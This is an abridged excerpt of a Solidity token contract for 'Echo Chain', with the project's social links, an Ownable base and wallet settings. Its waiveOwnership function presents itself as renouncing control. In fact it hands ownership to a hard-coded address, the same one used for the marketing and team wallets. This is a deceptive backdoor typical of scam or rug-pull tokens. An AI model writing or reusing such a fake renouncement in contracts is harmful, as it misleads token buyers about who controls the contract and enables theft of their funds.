...
/**
Telegram : https://t.me/Echochainofc
Website  : https://echochain.live
Twitter  : https://twitter.com/echochainOfc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xEBF815bC02eA4bBF5425A0A9DF0E9f8b9685B6BD);
    }
...
contract echochain is Context, IERC20, Ownable {
    ...
    string private _name = "Echo Chain";
    string private _symbol = "Echo";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xEBF815bC02eA4bBF5425A0A9DF0E9f8b9685B6BD);
    address payable public teamWalletAddress = payable(0xEBF815bC02eA4bBF5425A0A9DF0E9f8b9685B6BD);
